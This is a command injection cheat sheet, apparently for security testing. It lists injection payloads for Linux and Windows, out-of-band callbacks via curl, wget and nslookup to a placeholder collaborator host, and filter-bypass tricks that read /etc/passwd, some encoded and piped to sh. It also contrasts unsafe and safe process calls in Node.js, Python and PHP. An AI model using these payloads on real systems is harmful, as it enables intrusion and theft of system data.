# Command Injection: Complete Reference

## Detection

### Basic OS Command Injection
```bash
# Linux
; id
| id
`id`
$(id)
|| id
&& id

# Windows
| dir
|| dir
& dir
&& dir
```

### Time-Based Detection
```bash
# Linux
| sleep 5
|| sleep 10
$(sleep 5)
`sleep 5`

# Windows
| ping -n 5 127.0.0.1
|| timeout 5
```

### Out-of-Band Detection
```bash
# DNS/HTTP callback
| curl http://COLLABORATOR.oastify.com
|| nslookup COLLABORATOR.oastify.com
$(wget http://COLLABORATOR.oastify.com)
```

## Exploitation

### Bypass Techniques

#### Space Filter Bypass
```bash
# Tabs instead of spaces
cat%09/etc/passwd

# IFS (Internal Field Separator)
cat${IFS}/etc/passwd

# Brace expansion
{cat,/etc/passwd}
```

#### Keyword Filter Bypass
```bash
# Quoting
c''at /etc/p''asswd
c""at /etc/p""asswd
c\at /etc/p\asswd

# Base64 encoding
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh

# Hex encoding
echo '636174202f6574632f706173737764' | xxd -r -p | sh

# Case variation
CaT /eTc/PaSsWd
```

#### Character Filter Bypass
```bash
# $() for char generation
$(printf "\x63\x61\x74") /etc/passwd

# Wildcard
/???/c?t /???/p?ss??

# Environment variable manipulation
$SHELL
$PATH
```

## Frameworks

### Node.js
```javascript
// Unsafe exec
require('child_process').exec('ls ' + input, callback)

// Safe: execFile
require('child_process').execFile('ls', ['-la'], callback)
```

### Python
```python
# Unsafe
os.system(f"ls {input}")
subprocess.call(f"ls {input}", shell=True)

# Safe
subprocess.call(["ls", input])
```

### PHP
```php
// Unsafe
system($input);
exec($input);
shell_exec($input);
passthru($input);
popen($input, "r");

// Safe
escapeshellcmd($input);  // Still risky
escapeshellarg($input);  // Better
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| OS command injection -> RCE | 9.8 | Network, Low, No auth, Full impact |
| Blind command injection (time-based) | 7.5 | Network, Low, No auth, Changed scope |
| Command injection with filter bypass | 9.1 | Network, Low, No auth, Full impact |